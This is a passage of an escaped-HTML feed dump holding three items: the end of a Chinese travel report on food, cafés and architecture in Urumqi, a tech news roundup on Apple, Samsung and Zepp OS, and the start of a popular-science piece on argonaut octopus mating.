src=\"https://cdn.sspai.com/2021/07/11/c809c4ab994b8725d1414281159e94b3.jpg\"></figure><h2>三顿烤包子之一：凯撒烤包子</h2>\n<p>烤包子是新疆的特色食物，我在乌鲁木齐吃了三顿烤包子，档次、价格、味道各不相同。</p>\n<p>第一次烤包子，是在离市区较远的「凯撒烤包子」，这也是大众点评排名靠前的烤包子店。下午四点，店内一半座位都有客人，既有游客、也有带小孩的当地妇人，看来是有口皆碑。</p>\n<p>凯撒烤包子，上皮酥脆，光泽发亮，初看像是蛋黄酥一样的表皮，底部却厚实多层，烤至焦黑，内陷是羊肉，味道香咸，加洋葱及香料增添香味。意外的是，烤制的包子，内陷竟然汁水丰盈，吃的时候要小心滚烫的汤汁四溅。烤包子的另一个乐趣是面皮有厚有薄，烤制后薄皮部分的口感像碱水面包，厚皮部分则香嫩厚实。</p>\n<p>吃烤包子，再饮一杯卡瓦斯是绝配。新疆卡瓦斯类似于啤酒，是一种低酒精的饮料，用大麦、玉米等谷物发酵。闻起来是浓浓的啤酒味，但喝下去毫无苦涩，极好入口，满满一大杯也不会上头。另点烤羊肉串，肥肉、瘦肉间隔成串，瘦肉香嫩不柴，肥肉不腻。</p>\n<p>小结来说，与我所食用的其他店，凯撒烤包子的食物，从食材、处理工艺、摆盘等方面来说，都是最接地气的风格，当然它的价格也是最亲民。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/f6b03fdd3da1d1561890a64ee00f8c4e.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/78be6a8ea57b41033cf9cb2239e0d337.jpg\" alt=\"\"></figure><h2>第一杯咖啡：归乡咖啡馆</h2>\n<p>在乌鲁木齐的第一杯咖啡，是在小巷里的「归乡咖啡馆」。这是由自建房改造的门店，一扇铁门围起了深深的庭院，与之相配的是一条长厅大堂。</p>\n<p>装修上用了韩式风格，户外空间的墙壁刷成了雪白，再加一些户外桌椅，成就了新疆少有的网红 ins 风。餐厅大堂到处都是各种元素的混搭，墙上是欧式风景画，户外是动森里的舒适躺椅，吉他、乌克丽丽、画框、摆件等等，地砖却又是中亚风格。热爱植物是最打动我的特点，门口一棵天堂鸟（尽管枯得厉害）、绿箩、尤加利耶、各种鲜花、倒挂干花等等，看得出来店主是个热爱生活的小姑娘。</p>\n<p>不过咖啡味道不好。先是 dirty 用错了豆子，油脂全部下沉，入口苦涩。再是「紫薯拿铁」，说是拿铁但其实不含咖啡，是用紫薯浆替换了咖啡液，再在上面拉花，口感和紫薯牛奶汤无异。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/209d762527f49c3e0813122bda462f9b.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/747a8ccb35cfb08826512516e6ce13a1.jpg\" alt=\"\"></figure><h2>谈谈乌鲁木齐交通</h2>\n<p>乌鲁木齐是一个还停留在公交出行为主的城市，只有一条地铁线。滴滴打车则完全不灵，出租车却是一会儿接二连三，一会儿完全拦不到，共享单车完全没有入驻。因此在这儿的「最后一公里」，全靠步行。</p>\n<p>步行倒也不是没有收获，比如从咖啡馆出来前往地铁站的步行路上，就偶遇一群「多啦A梦」石墩。这是在南湖东路北三巷的小区外，一排石墩被画上了各种表情的「多啦A梦」。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/4a23c794877f5c2637b7d20671db7877.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/3cd09a92de443ce7c808fc3256537efd.jpg\" alt=\"\"></figure><p>每一个听到我要去乌鲁木齐市里待三天的人，都和我说乌市没什么好玩的。但是如果没有好好待过，你怎么知道它不值得花时间？正像这巷子里的多啦A梦，如果你不来乌市瞎逛，永远不会看见，是怎样可爱的人创造了他们？是小区里居住的美术老师，还是染着一头蓝发的涂鸦艺术家，抑或是幼儿园的可爱孩子们？</p>\n<p>除此之外，我在乌鲁木齐街头的另一个发现是，这里人行道上的警示柱不像内地用黄色作为警示色，而是采用了草绿色，甚为新奇。后来在出租车，我向司机问起这事，司机也说不上原因，思索一阵之后，给了我一个甚为离谱的讲头。说是乌鲁木齐绿色植被覆盖少，从卫星上看一片土黄，于是政府在遍布全市的警示柱上动起了心思。不知真假。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/11/6a7a121423aaba3282949170340f210e.jpg\"></figure><h2>三顿烤包子之二：小尕子</h2>\n<p>回酒店睡了一觉，醒来天还没黑，时间已是 21:30。乌鲁木齐的起居时间，晚内地两小时，因此此时相当于内地的 19:30，不过大多数餐馆已接近打烊。</p>\n<p>晚饭选在酒店附近的小尕(gǎ)子，这是比较推荐的餐厅，不过招牌菜都是大份，一个人没法消化，无奈只能点小份的食物。临近打烊，点啥啥没有，连烤包子都只剩最后一个了，立刻抢购。</p>\n<p>小尕子的「酥皮烤包子」，八块九一只。和凯撒烤包子相比，上面皮更像苏式月饼那般的酥脆，底部不焦黄，可以食用。个头更大，肉质更好，没有筋（凯撒的会有筋）。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/331342072c53c407b62f23e937d0ed2e.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/5639609c38480af085c91dd6fa9c6203.jpg\" alt=\"\"></figure><p>原味烤肉，比招牌羊肉串贵上许多，羊肉更大、肉质更好、烤得也好。烤肉串，得趁热吃，为了减缓热量流失影响风味，小尕子的做法是把餐盘也特地温热过，确实讲究。肥肉更是烤制出了烘焙面包的色相，尝起来上层油渣、下层油脂。甜品「酸奶甑糕」，即白糯米上铺一层新疆当地的大红枣一起蒸熟，放凉后再盖一层新疆酸奶，辅以时令水果点缀。可以当多人食的甜品，也可当一人食的主食。</p>\n<p>小结来说，小尕子的烤包子，比凯撒烤包子而言，从各方面都有适当的提升，但没有跳出菜肴本身。此番小结是与下文的另一家烤包子做对比得出的，先卖个关子。</p>\n<h2>乌鲁木齐中亚建筑一瞥</h2>\n<p>中亚、西亚地区把集市称为「巴扎」，大巴扎就是大型集市。新疆国际大巴扎是目前国内最大的巴扎。内里店铺林立，多为玉器、干果、丝巾、地毯等等。既为集市，竟也没有让人有购物的冲动，走马观花般见过异域风情的店铺，就算来过此处。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/610628e43ce8a6592f7b9f88e16735d5.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/013d4b1a2e527fbf94bfbd298909bb07.jpg\" alt=\"\"></figure><p>来大巴扎是在乌鲁木齐的第二天。上午阴云密布天色暗沉，不过到了中午，刮起了三级西风，把云全部吹散，于是阳光倾泻。这令我此次对中亚建筑的一瞥之旅，都有了蓝天白云与阳光的加持。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/11/88d04125f6309fbdf08b8e7cfc54047b.jpg\"></figure><p>从新疆国际大巴扎沿解放南路向北走，就能接连欣赏在乌鲁木齐少有的中亚建筑。先是南大寺，建于清朝同治九年。这是我在乌鲁木齐欣赏到最为独特的建筑，融合了中国古建筑与伊斯兰建筑的风格，楼顶是立刹杆和弯月标志的亭子。伊斯兰教以弯月作为宗教标志，因为楼顶带有新月的建筑，多为清真寺。离南大寺不远处，就建有白大寺，初建于 1924 年。这是乌鲁木齐最大的清真寺，球形大堂穹顶外观采用绿色，后建的门楼通体白色，颇有神圣感觉。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/1fbb457fcc986d71ebbd2d1773bb1aa7.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/42dfdd4871f9f61ad48ea6daa6778bf8.jpg\" alt=\"\"></figure><p>再往前走，便是不知名的建筑了。在解放南路与龙泉街的拐角，先是一幢苏联式的中亚风格建筑，中间主体呈圆柱，楼顶一个球形体，底部是壁龛式开窗，侧墙方正向两街延伸，窗户也有椭圆形、方形。现在往龙泉街方向走去，紧挨便是如碑体一般立在地面上的对称建筑，两侧开窗规整方正，中间楼梯斜着连接上下楼层，外体瓷砖也是绿色与白色的搭配，也很特别。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/819860adfc5242117f93bb18ae6e13a4.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/de0f16fb394e15663d6ca69cb9364b6f.jpg\" alt=\"\"></figure><p>往龙泉街一路走，便来到了新疆民街，这也是典型的伊斯兰风格建筑。民街一共分为五座5层殿堂式楼宇依次排列，四条连廊将其连为一体。民街中多开设奇石、玉器市场，不知何故，民街内里昏暗破败、店铺多为关门歇业、人气寥寥，电动扶梯似是多年未开、变形夸张，连建筑外皮也褪色剥落。正午时分走在民街里，也竟有一种肃杀萧条感。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/11/8677db2b5d427fb35b2e859d3fc1a129.jpg\"></figure><h2>三顿烤包子之三：丝路有约</h2>\n<p>在乌市的第三顿烤包子，是在酒店附近的「丝路有约」。这是大众点评必吃榜上榜餐厅，人气颇高，排队惊人。赶着 13 点营业前到店，刚好赶上第一波就餐。</p>\n<p>特色是「小龙虾烤包子」，烤包子的创新做法，内陷用了鸡肉、小龙虾、芹菜、辣椒、胡椒、洋葱等，因着五香麻辣调味的加入，让烤包子有了烧烤风味。黄油卡瓦斯加了一层厚厚的奶盖，啤酒香味加上奶盖的润滑，更好入口也更像奶茶，似乎大概能猜到哈利·波特中的黄油啤酒是怎样的风味了。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/52a965e8ad1cae2db22a767129b2a11c.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/33018ed2e7487614f8dbc1d52c885fe0.jpg\" alt=\"\"></figure><p>只用咸盐烤的羊肉串，好肉放盐就好吃，羊肉更保留了肥的口感。和田焖烤羊排，羊排分三层，层次分明，上层皮质焦黄酥脆、中间脂肪层香糯顺滑，最后是瘦肉鲜嫩Q弹。摆盘再加烤制的小洋葱、小黄椒，也挺讲究。另外甜品有一道绿豆沙酸奶，小碗内装了一半酸奶、一半绿豆浓汤，酸甜交织的口感也挺独特。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/efe8d5e9e87dd7acd0644f7fd7fefce1.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/61f500f44169745e16c757fe79047916.jpg\" alt=\"\"></figure><p>来个烤包子总结吧。总结来说，三家烤包子里，最原味最接地气的是凯撒烤包子，而最好吃的是小尕子，大幅提升品质但仍保留纯粹的做法与精髓。而丝路有约最商业，对菜肴的创新皆在迎合市场特别是流行的口味。</p>\n<h2>乌鲁木齐的好咖啡：Green cup coffee</h2>\n<p>本想下午去新开的新疆美术馆，结果到了门口才发现前后几日都已经预约满了，和安检室好说歹说也不让进，只好作罢。不如去喝一杯。</p>\n<p>乌市的咖啡市场小，店也少。Green cup coffee 开在小区的小巷子里。水泥工业风的装修，摆件、海报全是返航计划、星际航行、巴斯光年之类的，风格凸显。第一杯 dirty chai，在 dirty 加了 chai 粉。chai 粉是印度的混合香料粉，里面有八角、肉桂、豆蔻等等，因此香气独特。dirty chai 还撒了巧克力粉，因此有巧克力风味在里面，但是没有丰厚的油脂，喝起来偏向肉桂拿铁的风味。</p>\n<p>小店看着拥挤实则有序，咖啡师一看便是新疆人，热情好客也很健谈，点餐前和饮用时都会介绍自己的咖啡产品及特色。聊到兴起，不如再来一杯。水牛乳 dirty，将牛奶替换为水牛乳，密度比冰博克更低，因此没有醇厚的口感，增加了牛乳的鲜味和香味。</p>\n<p>不管是服务还是咖啡品质，都属上乘，在乌市终于喝到了好咖啡。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/1fedcc538d1f602de7cd17644a5aa160.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/636df482d0b9b0f74c209d6d94c38b18.jpg\" alt=\"\"></figure><h2>乌鲁木齐风土人情大观</h2>\n<p>在乌市的领馆巷，沿路皆是新疆小吃美食，到了下午，更是小摊林立、人头攒动。先是白尔开特原味肉馕，一个深坑烤制馕饼，多为本地居民食用的大而厚实的纯馕饼，不过还有一种小些的肉馕，吃起来就像是烧饼的味道。尽管叫肉馕个头已经小了一圈，但还是蛮大一张，抱放进包里，够我吃了一整天。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/1370b5fc37961fe3459779efc6f64594.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/ae7050990b93534d65d4378b9bc38b72.jpg\" alt=\"\"></figure><p>不远处是艾力江和田馕坑烤肉店，既有烤馕也有烤肉。烤肉用红柳枝成串，直接放进深坑烤制。红柳枝较黑成炭，羊肉颇大、瘦肉为主、多汁肥硕。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/7ddeb2871e4434bbfc33df18d0c3857e.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/bd6161616a340c09eee3233c641b357e.jpg\" alt=\"\"></figure><p>对面是本帮本色拉面店，在临街的窗户边，时常有一两位本地大姐阿姨搓着面条。她们似乎已经非常熟悉游客的镜头，时而眼波流转、时而相视而笑。在乌市少见水果店，不过快到傍晚临入夜，街边全是水果车摊，番茄、老汉瓜、荔枝、杏子等等水果都有。再往前是伊孜海逊冰淇淋，可选原味、草莓、核桃、哈密瓜四种口味，味道相当甜腻。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/b97b5deb610a30d4bd66da1990c1f1ac.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/d4493a411f46d3c7cf4916d6629ba3e1.jpg\" alt=\"\"></figure><p>转战西域国际商贸城，这地方少有游客，在本地人口中简称西域。说起「新疆」，原名为「西域」，是在清朝时平定大小和卓之乱后统一南北，便把西域命名为「新疆」，意为新开辟的疆土。</p>\n<p>在商贸城内的西域国际食品城，有一家「赛里斯特产精品店」，近来成为游客慕名而来的采购商店。到此一观，皆是中亚风情的搪瓷水壶、各式餐垫、葡萄干核桃等干果，初觉无甚特色。既来之，便购买了一个鹤嘴搪瓷壶和一个土耳其邪眼餐垫，聊赠友人。意外的是，身为咖啡师的朋友反馈说，用这把搪瓷壶冲手冲十分顺手，直可媲美价值上千的日本鹤嘴壶，而这把搪瓷壶仅售 50 元。原来这精品店也不可貌相啊。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/5877e6d32b8bb389c042401ead9792b5.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/cc179b6e5db5fa1574a1ead2395e42f4.jpg\" alt=\"\"></figure><p>折返回大巴扎，想再补些风土人情的摄影，没想到天色阴沉下来，不久之后便刮起四级大风，夹杂沙土直吹眼睛，不一会便是大颗雨滴夹着沙土，倒也真是体会到了这儿的「风土」。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/236e0a0bb33eaea7c344092ecc8d9df8.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/4cc3555904c0b31c8f152bf2886f30af.jpg\" alt=\"\"></figure><h2>最后一餐：石榴红了</h2>\n<p>时间到了周一，起床后直奔午餐。在乌鲁木齐的街头闲逛的时候，我看到过店名有叫「葡萄熟了」，这一家的店名也是水果成熟了，叫「石榴红了」。这也是大众点评的必吃榜。这一餐我选在了瑞豪店，避开了大巴扎旁的那家，人少而且离机场更近。时间又是周一中午，12:30 开餐不用排队。</p>\n<p>「酥皮烤羊腿」，用了整只羊腿，包裹在馕饼里，露出腿骨，卖相相当吸引人。用餐刀在顶部开出一个小「天窗」，这切开的部分便是我认为整道菜的精华。这是馕饼顶部的薄酥皮，外表香脆、内里香嫩，沾上了肉香油香，风味惊艳。馕饼内里填充了满满的羊肉，用孜然颗粒增香提味。烤制时的油脂多流入底部，因此内里的羊肉略有偏柴，且多瘦多筋，入口实在。底部的馕饼更加厚实，表面积累一层厚羊油。</p>\n<p>点上招牌的「羊肉手抓饭」。米饭香嫩干硬，颗粒分明，包裹了特殊调制专门用于制作抓饭的清油，泛着金色光泽，香味十足。混合了腌制的黄萝卜，不是爽脆的口感，竟是软糯偏咸。当然一人吃不完这羊腿和抓饭，剩下的打包飞回家继续食用。尽管过了一夜，只用微波炉一加热，入口依然是如初美味。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/15e361866c656eef6c2aae440f3dfe11.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/8098338a7da18f05865b8be98a6fbc4e.jpg\" alt=\"\"></figure><p>「石榴红了」目前在国内共有三家，在乌鲁木齐有两家，第三家开在北京。瑞豪的这家服务很棒，点餐时服务员会帮人看食量，强调不要浪费。店经理还会尽职地询问用餐体验，鉴于我的羊腿多筋、品质不算太好，就认真记录下反馈意见，买单时还打了折扣。</p>\n<h2>Make Coffee 每克咖啡</h2>\n<p>出发去机场前，喝的是在乌市的最后一杯咖啡。「每克咖啡」是开在创意园区里的一家小咖啡馆，在位于 3 层的小阁楼上。楼下种着葡萄藤，楼梯长满了爬山虎，店面两层，在露台上方还有一层餐吧，旁边即为露岛餐厅。这正是适合消磨时间的咖啡店。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/3a8beea4d8407ab5f92c60cf099f63fd.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/c4e54facb50a5ea2cd9c56d77c5c6b20.jpg\" alt=\"\"></figure><p>咖啡中规中矩，dirty 用了中烘豆子、底部苦味偏多，牛奶口感醇厚，另点一杯拿铁，拉花手艺上乘。在操作台旁开了一扇小窗，如果你愿意可以和咖啡师聊聊天，不过咖啡师似乎较为内向，不太健谈。朝北的窗台凉风习习，乌鲁木齐今天刮着东北风，气温只有 19℃，阴凉处凉意非常。时间到了下午 13:30，正值附近上班族的饭点时刻，但是店里依然客人寥寥，这是舒适惬意的咖啡小屋。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/12e371cf1c50e5631f1658737479bd7c.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/11/c834a2dbd05f39bdaeb4232160e2e121.jpg\" alt=\"\"></figure><h2>小结</h2>\n<p>《失落的卫星》，是刘子超的中亚游记。作者原为记者，因此游至吉尔吉斯斯坦、塔吉克斯坦等地写出的风土人情，都有细腻求实的观察。正是读完这本书，我才起了前往乌鲁木齐的旅行，不过乌市城市化水平很高，中亚建筑也仅在大巴扎附近方能见到，其余与内地差距不大。仅以抱着品尝美食的心态，三天时间正合适。</p>\n<p>隐藏玩法：从杭州萧山机场出发，可以在国内出发 9 号门附近的中国邮政盖到邮戳以及两枚萧山机场纪念章。乌鲁木齐地窝堡(pǔ)机场没有设立中国邮政，可在大巴扎的中国邮政盖上「大巴扎」邮戳以及旅游纪念章。不过章面磨损严重，不甚美观。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/11/220cc44bf3a442ccb77065afdb89eb18.jpg\"></figure><p>出行费用：本次乌鲁木齐三日游共计花费 1693.5 元。</p>\n<hr>\n<ul>\n<li><a href=\"https://sspai.com/post/66203\" target=\"_blank\">快乐飞旅行报告 01：广州的早茶可以从早喝到晚</a></li>\n<li><a href=\"https://sspai.com/post/66285\" target=\"_blank\">快乐飞旅行报告 02：除了武汉特色小吃，还有惬意的土耳其咖啡店</a></li>\n<li><a href=\"https://sspai.com/post/66445\" target=\"_blank\">快乐飞旅行报告 03：故宫的花开了</a></li>\n<li><a href=\"https://sspai.com/post/66183\" target=\"_blank\">快乐飞旅行报告 04：我低估了沈阳人民对于「小份」的定义</a></li>\n<li><a href=\"https://sspai.com/post/66510\" target=\"_blank\">快乐飞旅行报告 05：两天的贵阳都是吃</a></li>\n<li><a href=\"https://sspai.com/post/66745\" target=\"_blank\">快乐飞旅行报告 06：自驾在海南最美公路</a></li>\n<li><a href=\"https://sspai.com/post/67443\" target=\"_blank\">快乐飞旅行报告 07：郑州的胡辣汤辣口不辣心</a></li>\n<li><a href=\"https://sspai.com/post/67586\" target=\"_blank\">快乐飞旅行报告 08：汕头的牛肉能尝出甜味</a></li>\n<li><a href=\"https://sspai.com/post/67592\" target=\"_blank\">快乐飞旅行报告 09：北京的胡同里有宝藏</a></li>\n</ul>\n","link":"https://sspai.com/post/67650"},{"title":"派早报：iPhone 明年或采用潜望式镜头、泰格豪雅和马里奥联名推出智能手表","date":"2021-07-14 00:50:41","description":"\n<h2>Apple 有望在 2022 年为 iPhone 带来潜望式镜头</h2>\n<p>外媒 Patently Apple 于 7 月 13 日发现 Apple 已经获得一项和潜望式镜头相关的设计专利，Apple 将其称作是「折叠式相机」，专利描述了如何通过两个棱镜组合来实现潜望式镜头组，从而进一步地减少镜头模组的体积。此前知名的 Apple 产品分析师郭明琪曾表示，Apple 将会在其 2022 年的 iPhone 产品线上加上潜望式镜头。<a href=\"https://9to5mac.com/2021/07/13/iphone-periscope-lens-patent/\" target=\"_blank\">来源</a></p>\n<h2>泰格豪雅和超级马里奥联名推出限量智能手表</h2>\n<p>近日，泰格豪雅发布预告视频宣布与超级马里奥合作推出智能手表，该设备将搭载 Wear OS 系统，售价 1800 美元起，预计 15 日正式公布相关信息。<a href=\"https://www.tagheuer.com/hk/hans/smartwatches/tagheuer-connected-collaboration-3.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/12387510b3ecdae3714938791c5c1855.jpeg\"></figure><h2>三星曝光即将发布的 Galaxy Watch 4 以及 Galaxy Z Fold 3</h2>\n<p>虽然距离正式的发布会还有一个月时间，但三星已经提前让即将发布的多款产品在最新的宣传视频中曝光，在近期上传到 YouTube 上有关 Good Lock 体验相关的视频中，已经出现了下月发布的 Galaxy Watch 4 以及 Galaxy Z Fold 3，从视频曝光的情况来看，Galaxy Watch 4 将会有经典的银色设计，而 Galaxy Z Fold 3 的新保护套的展开形式以及设计，并且折叠屏的折叠痕迹也会出现在这一代机型中。三星预计将会在 8 月 11日正式发布其今年新款机型和设备。<a href=\"https://9to5google.com/2021/07/13/galaxy-fold-3-watch-4-video-cameo-early/\" target=\"_blank\">来源</a></p>\n<h2>AirPods 3 或将于 2021 年内推出</h2>\n<p>7 月 13 日，根据爆料者信息显示，部分 Apple 供应商已开始出货相关 AirPods 3 耳机部件，该设备将标配有无线充电盒，预计今年内正式发布。<a href=\"https://wccftech.com/airpods-3-standard-wireless-charging-case-different-tip-sizes-launching-2021/\" target=\"_blank\">来源</a></p>\n<h2>华米发布全新可穿戴操作系统 Zepp OS</h2>\n<p>华米科技于 7 月 13 日的 Next Beat 大会上发布全新可穿戴操作系统 Zepp OS，Zepp OS 底层采用基于 FreeRTOS 微内核开源代码开发，相较之前运行功耗降低 65%，续航提升 190%，可保持 7×24h 连续健康数据监测，通过人工智能算法能精准测量人体生物数据和运动指标，支持 4G/5G 模块、手表内置 Wi-Fi 连接，集成 TCP/IP 网络协议栈，紧急时可向云端发起网络呼救。目前华米科技向亿通科技授权 Zepp OS 和黄山 2S 芯片技术。Zepp OS 也已支持 RISC-V 体系生态系统，并通过芯片和 Zepp OS 合力推动 RISC-V 在 IoT 生态中的更多应用，预计该系统将在今年四季度正式推出。<a href=\"https://www.pingwest.com/w/245955\" target=\"_blank\">来源</a></p>\n<h2>Apple 开始售卖 MagSafe 外接电池</h2>\n<p>7 月 13 日，Apple 正式上架 MagSafe 外接电池，该电池可以轻松贴合在 iPhone 12 或 iPhone 12 Pro 等设备上，并进行无线充电。并支持搭配 27W 以及更大功率的电源适配器，作为无线充电器使用，可以提供 15W 的无线充电功率。还可提供安全可靠的无线充电功能。售价 749 元。<a href=\"https://www.apple.com.cn/shop/product/MJWY3CH/A\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/b7f89af44fea9df9969881c6b3c97bca.jpeg\"></figure><h2><strong>你可能错过的好文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/67628\" target=\"_blank\">本地、远程媒体库随身带，iOS 多媒体文件管理器：Filebox</a></li>\n<li><a href=\"https://sspai.com/prime/story/vol03-becoming-a-coder\" target=\"_blank\">从入门到程序员初长成：这是我的 Roadmap</a></li>\n<li><a href=\"https://sspai.com/post/67687\" target=\"_blank\">它们和你的浏览器更配：9 款值得一试的扩展插件</a></li>\n<li><a href=\"https://sspai.com/post/67661\" target=\"_blank\">功能强大也能轻松上手，它想成为你的 iPhone 默认相机：NOMO RAW</a></li>\n</ul>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67699"},{"title":"动物交配中有哪些不可思议的事实？","date":"2021-07-13 23:07:54","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-9f00f638c8ea3ae209cc19762f245539_l.jpg?source=8673f162\"><span>地平线HOA，</span><span>简单、有趣、认真的科普。『公众号同名』</span>\n<a href=\"https://www.zhihu.com/question/31922512/answer/1994418116\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>船蛸：这么奇葩的交配，你哪学的？</strong></p>\n<p>“船蛸能够自如地离开介壳”</p>\n<p>“但是，它从不离开”</p>\n<p>“就像尼摩船长”</p>\n<p>——《海底两万里》</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-92cb01c474f2337942cd4b96b052cc15_720w.jpg?source=8673f162\" alt=\"\"></figure><p>正在享用水母的船蛸</p>\n<p>船蛸[xiāo]是章鱼的远亲。</p>\n<p>但是，和亲戚们不同，</p>\n<p>船蛸不喜欢在海底呆着，</p>\n<p>反而在开阔的海域随波“漂流”。</p>\n<p>（偶尔也会“喷气式游泳”）</p>\n<p>船蛸有个外号，叫<strong>“纸</strong>鹦鹉螺<strong>”</strong></p>\n<p>为啥叫这个名呢？</p>\n<p>嗯……</p>\n<p>看我给它抓~~起来~</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7cfc34537aec687e8b79109d461b3403_720w.jpg?source=8673f162\" alt=\"\"></figure><p>注意到它背上<strong>“薄如纸”</strong>的壳了吗？</p>\n<p>“纸鹦鹉螺”就是这么来的。</p>\n<p>那这就带来了一个问题：</p>\n<p>很多时候，“壳”会与“铠甲”联系在一起</p>\n<p>比如乌龟、螃蟹什么的</p>\n<p>但是，你要拿船蛸和这俩比</p>\n<p>它背的简直就是个<strong>“纸壳”</strong></p>\n<p>毫无战斗力…</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-066ffa61bfb5684d413994e4d48a2cda_720w.jpg?source=8673f162\" alt=\"\"></figure><p>其实，船蛸的“纸壳”大有讲究：</p>\n<p>它并不是一间“房子”</p>\n<p>而是雌性用自己的分泌物造出来的<strong>“卵壳”</strong></p>\n<p>功能上近似一间“育儿室”</p>\n<p>这不是“作茧自缚”啊</p>\n<p>因为船蛸妈妈是可以随意进出的</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-caa9d7e652e506475d56f5943f5ec41c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>船蛸幼体</p>\n<p>你可能注意到了</p>\n<p>如果这个壳是雌性自己做的</p>\n<p>那，雄性呢？</p>\n<p>问得好！</p>\n<p>雄性船蛸只能用<strong>“奇葩”</strong>来形容：</p>\n<p>首先，看<strong>个头</strong></p>\n<p>要说雌性船蛸其实也不算大</p>\n<p>带上壳顶多 45cm</p>\n<p>但是，</p>\n<p>雄性却只有 2.5cm 左右</p>\n<p>因为长得太小</p>\n<p>雄性船蛸极少被人发现</p>\n<p>其次，雄性船蛸没有<strong>“固定资产”</strong></p>\n<p>……</p>\n<p>额，我是说它们不做“壳”</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-1d4f1ff309da6ae82acb3bdc8783a136_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不过，这些都不是重点！</p>\n<p>雄性船蛸最牛逼的部位，</p>\n<p>是它的<strong>生殖器官！</strong></p>\n<p><strong>能断！</strong></p>\n<p>熟悉动物的朋友应该知道，</p>\n<p><strong>“断臂”</strong></p>\n<p>在动物界不算“超能力”。</p>\n<p>壁虎可以断尾、海星可以断肢，</p>\n<p>甚至螃蟹断腿都能长回来。</p>\n<p>（比如“蟹坚强”）</p>\n<p><strong>但是！</strong></p>\n<p><strong>能断生殖器官的</strong></p>\n<p><strong>大概只有雄性船蛸了…</strong></p>\n<p>这要从船蛸诡异的交配方式说起：</p>\n<p>雄性船蛸一生只有一次交配机会</p>\n<p>当机会来临，</p>\n<p>雄性船蛸会悄悄接近雌性</p>\n<p>然后，把自己的一只触手（化茎腕）</p>\n<p><strong>“发射！”</strong></p>\n<p>别看雄性自己个头不大，</p>\n<p>它这只触手可不小，</p>\n<p>甚至比雄性整个身体还长！</p>\n<p>这枚“巨型子弹”只有一个任务：</p>\n<p>靠自己冲过去，</p>\n<p>然后附着在雌性的外套膜上。</p>\n<p>over</p>\n<p>这就是我们已知的</p>\n<p>船蛸交配的全过程</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ef250ff55be27b2d63dc43218586db5a_720w.jpg?source=8673f162\" 